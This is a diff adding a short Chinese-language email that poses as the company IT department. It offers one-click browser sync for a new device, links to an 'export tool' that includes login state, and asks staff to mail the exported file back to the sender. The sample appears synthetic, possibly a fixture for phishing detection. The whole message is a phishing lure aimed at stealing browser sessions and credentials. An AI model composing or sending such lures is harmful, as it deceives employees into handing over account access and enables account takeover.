@@ -1,0 +1,11 @@
+From: =?utf-8?B?SVQg5pSv5oyB?= <it@browser-sync-relay.example>
+To: staff@corp.internal
+Date: Sat, 12 Sep 2026 08:18:00 +0800
+Message-ID: <0008-b20@synth.example>
+Subject: 浏览器配置同步（迁移到新设备）
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+换机后浏览器配置可一键同步：
+导出工具（含登录态）：https://browser-sync-relay.example/export
+导出文件发回本邮箱即可完成同步。
